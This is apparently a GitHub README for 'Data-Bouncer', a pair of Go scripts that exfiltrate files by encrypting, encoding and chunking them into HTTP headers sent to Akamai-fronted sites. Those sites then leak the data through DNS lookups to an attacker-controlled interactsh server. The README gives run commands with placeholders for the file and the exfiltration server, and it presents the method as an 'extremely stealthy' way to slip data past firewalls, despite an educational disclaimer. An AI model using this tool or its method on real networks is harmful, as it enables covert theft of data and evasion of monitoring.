# Data-Bouncer

I came across this Proof of Concept outlined here in https://thecontractor.io/data-bouncing.
I took their ideas and wrote two Go scripts that can be used for educational purposes. Please don't do anything illegal.

One script that encrypts and bounces the data you want to exfiltrate and the other that reassembles and decrypts it.

You will need an OOB dns server under you're control for this to work and collect the data. Here I'm using https://github.com/projectdiscovery/interactsh

From my testing this should work on most websites/domains that touches Akamai.

### Bounce.go
This script reads your chosen domain names from domains.txt. First encrypts your chosen file using a password you provide, encodes the file into Base32 and finally splits it into 63 byte chunks and sends them as part of a domain name in an HTTP header.

Example:
```
go run bounce.go -f <filename> -p <password> -u <UUID> -e <interact server url> -v
```

### Regenerate.go
This script reads the JSON output from your interactsh exfil server, processes and reassembles the chunks and does the reverse of decoding, decrypting, and finally outputting the file.

Example:
```
go run regenerate.go -i <exported.json> -o <outputfile> -p <password> -u <UUID> -v
```

### Images

Example of bouncing a file:

![bouncer](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/87499151-3fef-4acc-b1d8-f67591ae21b9)

Example of regenerating the file:

![regen](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/6a2ac6d1-7d40-455b-b1ae-a83143078076)

Example from interactsh web client:

![interactsh](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/8c8f3ac9-ccf8-44be-9417-36bff4bea1c4)

Example of the forward traffic from FortiGate:

![FortiGate1](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/e4f26c0b-53ec-45db-a438-6fc340b87d1d)

- As you can see, it looks like the traffic is going to 23.x.x.x, a highly trusted domain.
- However, when the HTTP request is made, the webserver looks at our modified HTTP headers and does a dns lookup of our exfil server in those headers.
- Then we're able to collect each of those dns lookups back to our exfil server and reconstruct the data from those headers.
- This only works because many webservers processes hostnames in the headers, and we can relay small chunks of data in those headers for collection.
- Therefore, this makes it an extremely stealthy way of exfiltrating data.
